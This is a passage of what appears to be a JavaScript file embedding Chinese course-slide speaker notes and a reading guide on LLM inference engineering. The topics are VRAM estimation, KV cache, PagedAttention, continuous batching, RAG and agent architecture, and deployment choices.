这是高并发长文本场景下的**“首要显存杀手”**！公式是：$2 \\times 2 \\times \\text{层数} \\times \\text{KV头数} \\times \\text{头维度} \\times \\text{上下文Token总数} \\times \\text{并发数}$。一个 70B 模型如果并发 32 个请求、每个请求 16K 上下文，光是 KV Cache 就能吃掉上百 GB 显存！\n3. **第三分量：前向计算激活值（$M_{\\text{activations}}$）**。\n   单步推理做矩阵乘法时的临时张量，通常需要常驻预留 0.5GB 到 1.5GB；\n4. **第四分量（工程修正项 ①）：CUDA Runtime 与显卡上下文（$M_{\\text{cuda}}$）**。\n   显卡驱动加载、CUDA Context 初始化、CUBLAS 算子临时工作区（Scratchpad），**即使模型一行代码都不跑，直接吃掉 1.0GB 到 2.0GB 显存**！很多买 8GB 卡跑 7GB 模型的同学，就是被这一项直接送走的；\n5. **第五分量（工程修正项 ②）：框架调度与多卡通信缓存（$M_{\\text{comm}}$）**。\n   如果你用 vLLM 或 SGLang，系统会为 PagedAttention 预先申请 Block Table 显存池；如果你上了多卡张量并行（Tensor Parallelism，TP），NCCL 跨卡通信需要开辟专属通信 Ring Buffer，这项通常占用 1GB 到 3GB；\n6. **最致命的工程修正系数：显存分配器物理碎片（Fragmentation 15%~25%）**。\n   PyTorch 和 CUDA 的显存管理机制是通过 Memory Pool 动态分配的。不同用户的请求长短不一（有的问一句话 50 字，有的发了一篇 8000 字代码），频繁的动态申请和释放必然造成严重的内部与外部内存碎片。**在实际生产容量规划中，必须预留 15% 到 25% 的安全缓冲（乘以 1.20 系数）**，否则只要线上遇到瞬时突发流量，立刻雪崩 OOM！\n\n看清了这套工程修正模型，大家看底部的**硬件选型矩阵表**：\n- **7B/8B 规模**：INT4 模式下单卡 RTX 4090（24GB）是性价比极高的单兵神器，轻松承载 32K 上下文；\n- **14B 规模**：这是企业部门级业务的“甜点规模”，单卡 4090 或 A10/L40 完美承载；\n- **32B 规模**：DeepSeek-R1 蒸馏版的 32B 在代码和数学上表现极其强悍，双卡 4090 或单卡 A800 是中流砥柱；\n- **70B/72B 规模**：企业级全能中枢，双卡 A800/H800 或四卡 4090 构成主力生产阵列。\n\n拿着这套严谨的工程测算表去和运维、财务沟通，你的方案不仅能 100% 跑通，而且经得起任何资深架构师的现场质询！\n\n## Key Q&A / Clarifications\n**Q：如果预算有限，显存刚刚好卡在临界点，有什么紧急工程配置防止线上 OOM？**\nA：在 vLLM 或 SGLang 中有两大保底参数：第一，设置 `--gpu-memory-utilization 0.90`，给 CUDA Runtime 和临时激活留出 10% 的物理兜底空间；第二，开启 **Automatic Prefix Caching** 和 **Chunked Prefill**，平摊突发大请求的显存脉冲，并设置合理的 `--max-model-len` 限制极端长文本，同时开启请求队列调度（Queueing），宁可让后序请求排队等待几秒，也绝不超发显存导致进程崩溃。\n\n## Transition\n算准了显存容量，服务终于能顺利拉起来了。但当业务并发从 1 涨到 50 时，你马上会发现另一个瓶颈：显卡算力利用率极低，首字吐字奇慢无比。怎么在高并发下实现算力的高吞吐调度？下一页，我们来看 PagedAttention 与 Continuous Batching。\n","page_18.html":"## Slide Objective\n深入解析现代大模型推理调度系统的两大革命性突破：PagedAttention（显存虚拟分页管理）与 Continuous Batching（迭代级连续批处理调度机制）。建立并发数（Concurrency）、系统总吞吐量（Throughput）、首字延迟（TTFT）与字间延迟（TPOT）之间的四维工程权衡模型，帮助学员具备生产级模型服务调优与 SLA 保障能力。\n\n## Suggested Presentation\n上一页我们学会了怎么算显存。\n显卡买回来了，驱动和模型也装好了。但在真实的私有化生产部署中，架构师马上会遇到两个极其头疼的“终极瓶颈”：\n1. **为什么并发一上来，显存利用率看起来只有 30%，系统却开始频频报 OOM？**\n2. **为什么显卡的 GPU Core 占用率常年在 20%~40% 晃荡，明明还有算力，服务吞吐量却卡死了？**\n\n要解决这两个难题，我们必须掌握当今开源推理引擎（如 vLLM、SGLang、TensorRT-LLM）赖以成名的**两大调度革命与性能权衡矩阵**！\n\n我们看左边的第一大革命：**PagedAttention（显存虚拟内存分页）**。\n在传统的推理框架里，为了防止生成过程中显存爆掉，系统必须假设每个请求都会生成到最大长度（比如 8K），提前在显存里给它切出一大块连续的物理内存。\n但大家知道，用户真实的回答往往只有两三百字。结果导致**系统 60% 到 80% 的昂贵显存变成了被占着茅坑不拉屎的“内部碎片”！**\nvLLM 的天才之处在于：它向操作系统的虚拟内存管理偷师！它把 KV Cache 拆解成一个个固定大小的 Block 页（比如 16 个 Token 一页）。显存像拼积木一样按需动态申请，底层物理显存完全可以东一块西一块离散分布，通过类似 OS 页表的 **Block Table** 在逻辑上把它们映射成连续序列。\n**这一招，直接把显存碎片浪费率从 80% 打到了 4% 以下！同样的硬件，可支撑的并发量瞬间翻了 2 到 4 倍！**\n\n我们看右边的第二大革命：**Continuous Batching（迭代级连续批处理）**。\n以前做深度学习推理，采用的是传统的“静态 Batching”：比如 4 个请求打包在一起，其中请求 A 只需要 10 个字，而请求 D 需要 1000 个字。系统必须傻等请求 D 全部吐完，这 4 个请求才能一起退出、放新请求进来！在漫长的等待中，GPU 的大量算力核心被迫闲置，这就是严重的“气泡（Bubbles）”！\nOrca 论文提出的 Continuous Batching 彻底改变了游戏规则：**把调度粒度细化到每一次迭代吐字（Iteration-level）！**\n每个 step 吐一个字。请求 A 在第 10 步生成完毕了？立刻让 A 带着结果离场，并在第 11 步毫秒级把队列里等待的请求 E 插进 A 空出来的槽位！GPU 核心永远在被高效喂饱，**系统总吞吐量直接再次暴增 3 到 5 倍！**\n\n最后，请各位架构师死死盯住中间的**“四大性能指标权衡矩阵（Trade-off Matrix）”**：\n当你做线上 SLA 承诺时，必须分清：\n- **并发数（Concurrency）**：系统同时并行的请求量；\n- **总吞吐量（Throughput，Tokens/s）**：系统每秒生产的总 Token 数。一般来说，Batch Size 越大，吞吐量越高，显卡综合 ROI 越高；\n- **首字延迟（TTFT，Time to First Token）**：用户发完请求到看到屏幕跳出第一个字的等待耗时。这个阶段叫 **Prefill 阶段**，它是**算力密集型（Compute-Bound）**；\n- **字间延迟（TPOT，Time per Output Token）**：流式打字机吐字的速度（比如每个字 30ms 还是 100ms）。这个阶段叫 **Decode 阶段**，它是**显存带宽密集型（Memory-Bound）**！\n\n**架构师的权衡法则：**\n如果你为了追求极致吞吐量，盲目把 Batch Size 开得特别大，那么每个 Decode 步长要搬运的 KV Cache 就会巨幅膨胀，导致单个用户的 **TPOT 变慢、打字变卡顿**；而且突发的长 Prompt 会让正在排队的请求 **TTFT 剧烈抖动**！\n生产中我们怎么兼顾？\n利用屏幕底部的 **Chunked Prefill** 将长请求切片，与连续批处理的 Decode 混合运算；再结合 **Automatic Prefix Caching（APC）** 让并发请求共享知识库物理页，最终实现高吞吐与丝滑低延迟的完美平衡！\n\n## Key Q&A / Clarifications\n**Q：在代码编写（Coding）场景中，TTFT 和 TPOT 哪一个更影响工程师的使用体验？**\nA：首字延迟（TTFT）通常更为致命！工程师在 IDE 里按 Tab 补全或修改 Bug 时，如果等了 4~5 秒才出来第一个字，思维节奏就会被打断，心理体验极差；一旦首字在 500ms 内快速跳出，即使后面的 TPOT 稍微慢一点（类似打字机匀速输出），人类注意力也会被流式文本吸引，容忍度大大提升。因此在 Coding Agent 私有化部署中，必须开启 Chunked Prefill 和 Prefix Caching，将 TTFT 压到极致。\n\n## Transition\n掌握了大模型底层的算力机理、显存模型与推理调度后，我们对于大模型的“物理形态”已经了然于胸。现在，让我们走出底层基座，正式步入工程师最关心的生产力实战世界——进入《第 02 课：AI 辅助编程入门》！\n","page_19.html":"## Slide Objective\n剖析裸大语言模型（Raw Foundation Model）不可违抗的四大底层物理边界：注意力衰减（Lost in the Middle）、自回归串行延迟墙、知识权重固化与概率采样非确定性；树立“大模型仅仅是 ALU，必须由软件工程架构构筑安全 Harness”的架构师最高工程心智。\n\n## Suggested Presentation\n在很多业务部门或产品经理眼里，大模型被神化成了无所不能的“银弹”——只要买个万亿模型，什么业务难题都能直接搞定。但作为首席架构师或资深工程师，我们必须比任何人都要清醒地看到：裸大模型在物理世界上存在四大不可逾越的客观边界。\n\n请看四个卡片：\n第一，注意力衰减与 U 型塌陷（Lost in the Middle）。\n厂商在宣传时总喜欢标榜“100 万超长上下文”。但斯坦福和伯克利的论文已经彻底证实：注意力机制存在严重的“首部优先与尾部优先偏置（Primacy & Recency Bias）”。当你在一个 128K 的超长文档中间第 64K 的位置埋入一个关键参数时，模型的检索命中率会呈现断崖式下跌！长文本不等于长记忆，把几十页文档一股脑扔进 Prompt 是极不负责任的偷懒架构。\n\n第二，自回归串行延迟墙。\n由于马尔可夫链的因果自回归依赖，Decode 阶段必须一个词接一个词生成。你在服务器里插 100 张 H100，也无法把单个请求从“每秒吐 40 个字”加速到“每秒吐 4000 个字”，因为这是光纤和显存芯片物理总线带宽决定的硬件铁律！这意味着对实时性要求在 10 毫秒以内的底层微服务，绝不能把大模型直接串联在同步调用链路上。\n\n第三，知识固化于截止期。\n模型完成训练后，权重参数就变成了静态文件。它对企业昨天刚上线的新订单、刚才发生的汇率变动一无所知；而且如果强行通过微调试图灌入新数据，还会引发灾难性遗忘。\n\n第四，概率采样的非确定性。\n即使将 Temperature 设为 0，因为 GPU 浮点加法不满足结合律，并发时依然可能发生微小的概率漂移。这就决定了大模型永远无法像 Java 的 `if-else` 或关系型数据库的 ACID 事务那样，为你提供绝对 100% 严丝合缝的硬编码契约。\n\n请看底部的架构结论：\n如果用计算机的发展历程来打比方，裸大模型充其量只是一个极度强大的“算术逻辑单元（ALU）”或者“推理协处理器”。如果把一个裸露的 CPU 芯片直接丢给普通用户，它什么也做不了！它必须配合外部内存、硬盘驱动、外设总线以及一个成熟的操作系统。\n这就是为什么我们要学整套课程：因为大模型所有的天然缺陷，全部都需要由外部的软件工程 Harness 体系（RAG 知识库、Redis 长期记忆、MCP 工具调用与状态机工作流）来精准兜底治理！\n\n## Key Q&A / Clarifications\n**Q：既然模型厂商一直在扩大上下文窗口（比如从 8K 到 1M），那我们未来还有必要做 RAG 和分块检索吗？**\nA：绝对有必要！第一，超长上下文的推理成本（Time & VRAM）极其昂贵，处理 1M Token 的延迟可能长达数十秒；第二，前面指出的“Lost in the Middle”中间注意力塌陷是注意力矩阵的固有物理特性，把非相关垃圾数据全部灌入只会严重稀释模型对核心事实的注意力。高质量的精准 RAG 检索不仅能替企业省下 90% 的 Token 成本，还能大幅提升回答的准确率。\n\n## Transition\n认清了四大物理边界，我们就能深刻理解：底层机理绝不是纯理论，它是反哺上层架构设计的“设计准则”。为什么理解底层机理是设计高阶 Agent 与 RAG 的硬门槛？我们进入 P20。","page_20.html":"## Slide Objective\n阐明底层机理如何直接反哺上层架构设计：深入剖析 RAG 分块对齐 Token 边界与克服中间注意力衰减的排版技巧，Agent 工具调用中依赖 GQA 与抑制 KV Cache 膨胀的工程策略，以及快慢思考分级路由与 Prefix Caching 缓存设计带来的 80% 降本实践。\n\n## Suggested Presentation\n讲到这里，很多后端或架构师同学可能会长舒一口气：“原来大模型底层这么复杂！但这些底层知识，对我们写业务、做应用真的有用吗？我们直接调 API 不就行了吗？”\n请大家看这页幻灯片：这就是“普通调包侠”和“真正 AI 原生架构师”的本质分水岭！底层机理绝不是屠龙之技，它直接决定了你的 RAG 检索准不准、你的 Agent 会不会雪崩、你的企业 Token 账单会不会失控。\n\n我们来看三个最典型的反哺案例：\n案例一，反哺 RAG 知识工程（左侧卡片）：\n如果你不懂 BPE 分词和 UTF-8 多字节原理，在写 RAG 数据切块时随便用了一个字符串截断库 `text[:500]`，就会高频切断汉字字节与 Python 代码缩进，向量数据库灌入一堆乱码；\n如果你懂了注意力机制的“Lost in the Middle（中间注意力塌陷）”物理规律，你在组装 Prompt 时就会采取极其精巧的排版：把最核心的参考知识切片，贴着 Prompt 的最开头（System 后面）和最结尾（用户提问正上方）放置，而把无关紧要的闲聊历史塞在中间深水区，命中率瞬间提升 30%！\n\n案例二，反哺 Agent 智能体工程（中间卡片）：\n在开发多步 ReAct 工具调用 Agent 时，很多团队发现随着工具调用次数变多，系统越来越卡，显存动不动报警。为什么？因为每次工具返回结果（比如一段巨长的 JSON 日志），都被重新拼接进下一次的 Prompt 中，导致 Decode 阶段的 KV Cache 像滚雪球一样呈指数级膨胀！\n懂得底层机理的架构师，首先会在模型选型时强制锁定支持 GQA（分组查询注意力）的高性能底座；其次，会在 Harness 治理层设计滑动窗口与工具返回日志的结构化剪枝；最后，在外部用确定性的状态机（FSM）设置最大步数熔断，彻底杜绝死循环导致的算力雪崩。\n\n案例三，反哺算力成本与模型路由（右侧卡片）：\n很多企业抱怨“大模型太贵了，用不起”。但如果你深入理解了“双引擎 Scaling”和“Prefix Caching 显存复用”：\n你可以设计一个轻量的分类前置路由器（Classifier Router）：80% 的简单信息过滤与格式化任务，直接路由给极其廉价的高并发 7B/14B 小模型；只有 20% 真正需要长链逻辑推理的任务，才唤醒昂贵的 DeepSeek-R1 / o1 慢思考模型；\n同时，严格规范 Prompt 的前缀排布，把静态系统提示词放在最前，绝不在最开头动态拼接时间戳，让推理引擎的 Prefix Caching 缓存命中率稳定在 90% 以上，输入 Token 计费立降 50%~80%！\n\n正如底部的寄语所言：懂底层机理，你才能在面对故障时直击物理本质，而不是两眼一抹黑去盲目试错。\n\n## Key Q&A / Clarifications\n**Q：在 Prompt 拼接时，为什么把时间戳（如 `Current Time: 2026-11-02 10:30:15`）放在 System Prompt 第一行会导致推理成本大幅上升？**\nA：因为主流高性能推理引擎（vLLM / SGLang）以及公有云厂商（如 OpenAI、DeepSeek、Anthropic）都支持 Prompt Cache（前缀缓存）。前缀缓存是基于从头开始的最长公共前缀 Token 哈希匹配的。如果你把每秒都在变化的时间戳放在最前头，系统就会判定前缀发生了改变，导致后续数千字本来可以复用的 System Prompt 全部无法命中缓存，每次都要全量重新进行 Prefill 计算与全额计费！正确的做法是把静态规范放最前，把动态时间戳移到最末尾。\n\n## Transition\n掌握了底层机理反哺业务架构的方法后，摆在企业架构师面前的还有一道根本选择题：在公有云 API、本地开源量化和私有化机房部署之间，我们到底该如何科学决策？我们进入 P21：架构师的技术栈选型全景矩阵。","page_21.html":"## Slide Objective\n为架构师提供企业落地大模型时的三大技术路线全景对比：公有云商用 API、单机端侧量化与私有化机房微调自建；从数据合规性、SLA 可靠度、总拥有成本（TCO）、并发吞吐需求与运维复杂度五个维度建立科学的选型决策树。\n\n## Suggested Presentation\n在企业立项做 AI 转型时，CTO 或架构委员会经常争论不休：“我们到底该直接买公有云 API，还是斥资几百万采购 GPU 自建机房？”\n没有绝对最好的架构，只有最适合当前业务阶段的架构。今天我们用一张全景矩阵，把这三条路线的优劣势和决策逻辑彻底梳理清楚。\n\n请看三条典型路线：\n路线 A：公有云商用 API 优先（左侧卡片）。\n无论是接入 OpenAI、DeepSeek、还是国内的通义千问、智谱，核心优势是“极快冷启动”与“零运维”。你不需要招聘昂贵的深度学习系统工程师，今天写两行代码，明天应用就能上线；而且模型升级完全由云厂商兜底。\n但架构师必须看清它的潜在隐患：第一是数据合规。欧洲有 GDPR，国内有数据安全法，涉密的核心财务、用户敏感数据绝不能物理出域；第二是长期调用的经济学——如果你的系统每天调用上亿 Token，公有云按 Token 线性计费的账单会让你痛不欲生；第三是公网网络抖动与高峰期突发的并发限流（Rate Limit）。\n\n路线 B：端侧与本地量化运行（中间卡片）。\n使用 Ollama 或 llama.cpp 在开发机（如 RTX 4090 或 MacBook Pro M3/M4）上跑 INT4 量化模型。它的最大优势是“100% 绝对物理隔离”与“零外部调用成本”。这是单兵研发辅助、内网代码审查与边缘离线设备（如工业巡检平板、车载终端）的杀手级选型。但它的劣势是受限于单机算力和显存，无法支撑部门级的高并发网络服务。\n\n路线 C：企业私有化机房 / 私有云微调部署（右侧卡片）。\n使用 vLLM 或 SGLang 集群，在公司内网的 GPU 服务器上部署开源开源大模型（如 Qwen-2.5-32B/72B、DeepSeek-V3/R1）。\n对于金融、军工、大型国央企，这是必由之路：数据 100% 在内网闭环，SLA 算力完全独占，且高并发下平均每百万 Token 的硬件摊销成本可以降到公有云的十分之一！更关键的是，你可以针对自己的企业私有规范做专属的 SFT 微调。但它的门槛是前期重资产硬件投入与持续的 GPU 集群运维成本。\n\n底部的五维决策树给出了最清晰的行动准则：\n如果数据高度涉密或要求强独占 SLA ➔ 坚定走路线 C 或 B；\n如果业务处于探索期、业务逻辑极其复杂多变、追求极致迭代速度 ➔ 果断走路线 A；\n在成熟的现代企业架构中，往往采取“混合架构”：绝密数据在内网私有小模型预处理，脱敏复杂任务路由给公有云最强大脑，达到安全与效能的黄金平衡！\n\n## Key Q&A / Clarifications\n**Q：初创团队或传统企业刚起步探索 AI，第一步应该自建私有化机房吗？**\nA：绝对不建议起步就重资产自建！起步阶段业务逻辑、用户价值与 Prompt 边界尚未验证，过早采购硬件容易造成数十万甚至数百万的资产闲置与折旧。黄金路径是：第一阶段全部接入公有云 API 快速验证 MVP 与业务闭环；第二阶段当业务量稳定、并发激增或数据合规提出刚性要求时，再平滑切入私有化模型部署。\n\n## Transition\n梳理完了技术栈全景选型，我们的认知大楼已经彻底封顶。最后，让我们来到 P22：总结全课，打通从“底层算力与算法”到“企业级工程架构”的完整认知链条。","page_22.html":"## Slide Objective\n全面收官并总结 01B《AI 认知进阶（可选深潜）：大模型底层工程与算力机理》五大核心篇章的知识闭环。打通从“底层算力与算法”到“企业级工程架构”的完整认知链条，帮助项目 Leader 与资深工程师构建起“既懂软件工程、又知底层算力”的复合型架构大格局，并顺畅导向后续的实战路线：《第 02 课：AI辅助编程入门》与《02B. AI辅助编程进阶》。\n\n## Suggested Presentation\n各位架构师、技术同仁，恭喜大家！\n在过去这几个小时的高密度沉浸中，我们共同完成了一次从大模型宏观外壳，到底层物理齿轮与分布式算力底座的深度穿越。\n\n我们快速回顾全课的五大核心里程碑：\n- **第一，在【扩展律前沿与推理全景】**：我们超越了简单的暴力预训练认知，吃透了 2024–2026 以 DeepSeek-R1 和 OpenAI o1 为代表的“推理时慢思考（Test-Time Compute）”第二引擎，并建立起端到端的张量计算图；\n- **第二，在【模型推理核心机理】**：我们把显微镜对准每一个 Token，拆解了 BPE 分词算法与其生产深坑，推导了 RoPE 相对旋转位置编码的外推机理，剖析了从 MHA 到 GQA 的降维工程，理解了 Softmax 采样微积分，并彻底搞懂了 Prefill 计算密集与 Decode 访存密集背后的 KV Cache 机制；\n- **第三，在【现代模型训练范式与前沿架构】**：我们走通了从 Pre-training、SFT、DPO 到 RLVR 的完整四阶段流水线，解答了为什么具备确定性编译器的代码和数学领域率先涌现出自省慢思考，并剖析了千亿 MoE 稀疏路由与 Native Omni 原生全模态架构；\n- **第四，在【模型文件、量化与算力底座】**：我们走出算法来到机房物理层，彻底扒开了 Safetensors 与 GGUF 的文件组织，掌握了 AWQ 激活感知量化原理与显存精准速算黄金公式，并理解了 vLLM/SGLang PagedAttention 显存池化调度对吞吐的救赎；\n- **第五，在【物理边界、架构反哺与全栈选型】**：我们认清了裸模型的四大客观物理边界，掌握了如何用底层机理反哺 RAG 切块、Agent 编排与模型路由设计，并为企业建立了三大路线的科学决策树。\n\n请大家看底部的寄语：\n在今天的 AI 工业浪潮中，最稀缺的人才，绝不是仅仅停留在调用 API、改改 Prompt 的调包侠，也不是只看学术理论却写不出工业代码的纸上谈兵者。\n真正能在激烈的工业竞争中带领企业构筑核心技术护城河的，是**既懂得现代大模型的张量流动、显存带宽墙与物理边界，又具备深厚现代软件工程底蕴，能够用严密系统驯服不确定大模型的复合型架构领军人才！**\n\n这门 01B《AI 认知进阶（可选深潜）》不仅为你打开了大模型黑盒，更为你抹平了软件工程与 AI 算力之间的鸿沟。让我们带着这份坚实可靠的底层工程心智，奔赴接下来的工程实战！谢谢大家！\n\n## Key Q&A / Clarifications\n**Q：学完 01B 之后，我们接下来该如何进阶？**\nA：01B 彻底奠定了坚不可摧的底层算力与机理认知。下一步，大家将全面进入后续的实战系列课程：\n1. **标准开发主线**：请直接进入**《第 02 课：AI辅助编程入门》**，全面实操 Cursor、Windsurf 与 CLI 终端自主 Coding Agent，掌握意图工程与单测自愈流水线；\n2. **团队架构进阶**：技术 Leader 与架构师可并轨选修**《02B. AI辅助编程进阶》**，深入掌握团队级工程规范制定与 Harness 自动化测评护栏；\n3. **全员汇入系统架构**：随后全员进入**《第 03 课：AI Agent 架构认知入门》**，并在 04~08 课中亲手实现交互工程、Redis+MySQL 长期记忆系统、RAG 企业知识检索、Tool Calling 与 MCP 外部连接，以及高可靠 Agent 工作流编排！\n\n## Transition\n感谢各位技术同仁的全程专注与深度参与！底层基座已牢不可破，让我们在《第 02 课：AI辅助编程入门》与《02B. AI辅助编程进阶》的工业级实战战场上并肩作战，再创辉煌！\n\n---\n\n## 课后扩展学习引导（讲师导读提示）\n> **讲师收官特别提示**：  \n> 在结束 01B 全课前，请特别向各位技术 Leader、系统架构师推荐课程根目录下沉淀的硬核工程宝典——**《扩展学习指南.md》**。  \n> \n> **建议引导话术**：  \n> “各位架构师与资深同仁，01B 的 22 页课件为我们搭建了坚固的底层心智骨架，但大模型微观算力与前沿架构是一个持续高速演进的深水区。为了让大家在企业私有化部署、高并发推理调优和技术选型中具备最坚实的技术后盾，我们在课程根目录下为大家提供了《扩展学习指南.md》。  \n> 该指南遵循 **3W 精选导读法则（Why - Where - What）**，聚焦 4 个最硬核的底层工程课题：  \n> 1. **推理计算图优化（FlashAttention 与 vLLM PagedAttention）**：剖析 GPU HBM 内存带宽墙，学习操作系统虚拟分页思想如何将推理碎片率从 80% 压降到 0；  \n> 2. **RoPE 旋转位置编码与注意力变体（MHA/MQA/GQA）**：直击二维复数旋转外推直觉与 GQA 削减 80% KV Cache 显存膨胀的工业权衡；  \n> 3. **慢思考强化学习范式（DeepSeek-R1、GRPO 与 RLVR）**：深度解读去掉 Critic 网络的纯强化学习机制，看清代码单测与数学规则等客观裁判如何激发模型的反思‘顿悟时刻’；  \n> 4. **企业私有化权重量化与格式解析（Safetensors/GGUF/AWQ）**：掌握保护 1% 显著权重的激活感知量化法则，杜绝 Pickle 代码注入隐患，指导高并发服务端与端侧轻量化选型。  \n> \n> 文末配备了针对真实业务场景的架构自测思考题与详细推导思路。请各位架构师务必将其作为技术选型与团队内部分享的核心参考！”\n\n"};
+  const extGuideMarkdown = "# 第 01B 课《AI 认知进阶（可选深潜）》课后深度扩展学习指南\n\n> **致技术 Leader、系统架构师与底层深潜工程师**：  \n> 01B 是一次直击大模型微观张量计算、GPU 显存物理布局与前沿分布式推理底座的深潜之旅。  \n> 当企业步入大模型私有化部署、高并发推理调优、长文本 Agent 编排以及垂直领域模型强化学习阶段时，技术决策者必须直面真实的 GPU 物理约束。本指南遵循 **3W 精选导读法则（Why - Where - What）**，精选 **4 个最硬核的底层工程主题**，帮助技术骨干穿透学术公式，吃透工业界顶级推理引擎与前沿架构的实现本质。\n\n---\n\n## 目录\n1. [主题一：推理计算图优化：FlashAttention 与 vLLM PagedAttention 显存池化原理](#主题一推理计算图优化flashattention-与-vllm-pagedattention-显存池化原理)\n2. [主题二：现代旋转位置编码（RoPE）与注意力变体（MHA / MQA / GQA）](#主题二现代旋转位置编码rope与注意力变体mha--mqa--gqa)\n3. [主题三：慢思考强化学习范式：DeepSeek-R1、GRPO 算法与 RLVR 蒸馏迁移机理](#主题三慢思考强化学习范式deepseek-r1grpo-算法与-rlvr-蒸馏迁移机理)\n4. [主题四：企业私有化权重量化与格式深度解析（Safetensors / GGUF / AWQ / GPTQ）](#主题四企业私有化权重量化与格式深度解析safetensors--gguf--awq--gptq)\n5. [课后架构自测思考题（附参考思路）](#课后架构自测思考题附参考思路)\n\n---\n\n## 主题一：推理计算图优化：FlashAttention 与 vLLM PagedAttention 显存池化原理\n\n### 1. 为什么值得深潜（Why - 生产触发场景）\n在企业自建大模型服务集群（如部署 70B 参数大模型）时，架构师最常面临的生产挑战是：**“为什么 GPU 计算核心（Tensor Core）利用率不到 30%，但显存却频频打爆 OOM？为什么并发请求稍微增加，吞吐量就断崖式下跌、TTFT（首字延迟）暴涨？”**  \n其核心根因在于 GPU 物理架构中的**内存带宽墙（Memory Wall）**——计算单元的速度远快于 HBM（高带宽显存）的数据搬运速度；而在长会话推理中，原生注意力机制产生巨大的 $N \\times N$ 临时矩阵，伴随严重的 KV Cache 显存碎片化。FlashAttention 与 PagedAttention 是现代 LLM 基础设施的两大支柱技术，理解其原理是调优 vLLM、SGLang 等算力底座的必备功底。\n\n### 2. 权威一手资料（Where - 核心信源与链接）\n- **FlashAttention 奠基论文**：Tri Dao et al., *\"FlashAttention: Fast and Memory-Efficient Exact Attention with IO-Awareness\"* (NeurIPS 2022)  \n  [arXiv:2205.14135](https://arxiv.org/abs/2205.14135) 与 FlashAttention-2 [arXiv:2307.08691](https://arxiv.org/abs/2307.08691)\n- **vLLM / PagedAttention 奠基论文**：Woosuk Kwon et al., *\"Efficient Memory Management for Large Language Model Serving with PagedAttention\"* (ACM SOSP 2023 顶会论文)  \n  [arXiv:2309.06180](https://arxiv.org/abs/2309.06180)\n- **vLLM 官方架构文档与源码库**：[https://github.com/vllm-project/vllm](https://github.com/vllm-project/vllm)  \n  核心源码文件：`csrc/attention/attention_kernels.cu` 与 `vllm/core/block_manager_v1.py`\n\n### 3. 高效阅读指引（What - 核心看点与避坑）\n- **核心必看点**：\n  1. **FlashAttention 论文第 2~3 节及 Figure 2**：重点观察标准注意力与 FlashAttention 的 GPU 访存路径对比。理解**分块平铺（Tiling）**与**在线归一化（Online Softmax）**数学技巧——它允许算法在小容量极高速的 SRAM 片上缓存中完成局部 Softmax 计算与缩放累加，根本不需要向 HBM 写入庞大的中间注意力矩阵，将 HBM 读写次数从 $O(N^2)$ 降低到 $O(N)$。\n  2. **vLLM 论文 Figure 4 与 Figure 7（虚拟内存分页类比）**：重点看物理显存块（Physical Block）与逻辑 Token 序列的映射表（Block Table）。传统推理框架为了保证连续数组内存，预先分配最大长度（例如 4K/8K），导致内部碎片率高达 60%~80%；PagedAttention 借鉴操作系统页表机制，每个物理 Block 仅存放 16 或 32 个 Token，实现显存零浪费和跨请求 Prefix Cache 的物理块共享（Copy-on-Write）。\n- **工程师避坑**：\n  - **不必纠结**：CUDA 汇编指令级调度、Warp 同步原语及硬件寄存器分配。\n  - **重点吸收**：理解 vLLM 中 `gpu_memory_utilization`（显存利用率）、`block_size`（物理块大小通常取 16 或 32）与 `max_num_batched_tokens` 对生产并发能力的决定性影响。\n\n---\n\n## 主题二：现代旋转位置编码（RoPE）与注意力变体（MHA / MQA / GQA）\n\n### 1. 为什么值得深潜（Why - 生产触发场景）\n为什么 2023 年之前的模型（如早期 Llama）上下文只有 2K~4K，而现在的开源模型（如 Qwen2.5、Llama 3）能够无损扩展到 32K 乃至 128K？为什么新一代模型在吞吐量上数倍于旧模型？  \n在模型选型与长上下文 Agent 架构规划中，架构师必须理解两项关键底层演进：一是位置编码从早期的绝对位置编码（Absolute PE）升级为具有优美外推能力的旋转位置编码（RoPE）；二是从全多头注意力（MHA）全面收敛至分组查询注意力（GQA），直接斩断 KV Cache 膨胀的咽喉。\n\n### 2. 权威一手资料（Where - 核心信源与链接）\n- **RoPE 奠基论文**：Jianlin Su et al., *\"RoFormer: Enhanced Transformer with Rotary Position Embedding\"* (Neurocomputing 2024 / 2021 首发)  \n  [arXiv:2104.09864](https://arxiv.org/abs/2104.09864)\n- **苏剑林官方博客解析**：追一科技苏剑林，《层次分解位置编码：旋转位置编码RoPE》  \n  [https://kexue.fm/archives/8265](https://kexue.fm/archives/8265)\n- **GQA 奠基论文**：Joshua Ainslie et al. (Google Research), *\"GQA: Training Generalized Multi-Query Transformer Models from Multi-Head Checkpoints\"* (EMNLP 2023)  \n  [arXiv:2305.13245](https://arxiv.org/abs/2305.13245)\n- **长上下文外推方案**：YaRN (*\"Efficient Context Window Extension of Large Language Models\"*, arXiv:2309.00071)\n\n### 3. 高效阅读指引（What - 核心看点与避坑）\n- **核心必看点**：\n  1. **RoPE 的二维复平面旋转直觉**：\n     - 在论文 Section 3.2 或苏剑林博客中，观察二维复数平面的旋转矩阵 $R_{\\Theta, m}^d$。\n     - 核心物理直觉：将词向量两两分组看作复平面上的点，位置为 $m$ 的词向量乘以旋转角 $m\\theta$，位置为 $n$ 的词向量乘以 $n\\theta$。两者的点积内积在数学展开后，绝对位置项自然抵消，只留下相对位置偏移 $(m-n)$！这使得模型天然具备相对位置感知能力。\n  2. **GQA 论文 Figure 1（MHA vs MQA vs GQA 拓扑对比）**：\n     - **MHA（Multi-Head Attention）**：$H$ 个 Query 头对应 $H$ 个 Key/Value 头，KV Cache 随着头数和层数线性暴增；\n     - **MQA（Multi-Query Attention）**：$H$ 个 Query 头全部共享唯独 1 个 Key/Value 头，显存极低但注意力表达能力受损；\n     - **GQA（Grouped-Query Attention）**：折中妥协的工业终局标准。例如将 32 个 Query 头分为 8 组，每组 4 个 Query 共享 1 对 KV 头。**将 KV Cache 显存直接压缩至 MHA 的 1/4 或 1/8**，而精度指标与 MHA 几乎持平！\n- **工程师避坑**：\n  - **不必纠结**：正交矩阵的高阶李群推导与高频分量衰减的傅里叶级数证明。\n  - **重点吸收**：长文本扩展时为什么调整 Base 频率（从 10000 放大至 500000 甚至 8000000）能够减缓高维旋转周期的饱和，实现免重训的窗口无损外推。\n\n---\n\n## 主题三：慢思考强化学习范式：DeepSeek-R1、GRPO 算法与 RLVR 蒸馏迁移机理\n\n### 1. 为什么值得深潜（Why - 生产触发场景）\n2024~2026 年大模型工业界最震撼的里程碑，莫过于以 OpenAI o1 与 DeepSeek-R1 为代表的**推理时计算扩展（Test-Time Compute Scaling）与慢思考（Slow Thinking）范式**。  \n面对复杂的企业级逻辑（如代码自愈、复杂 SQL 生成、风控合规校验），传统 Base/Chat 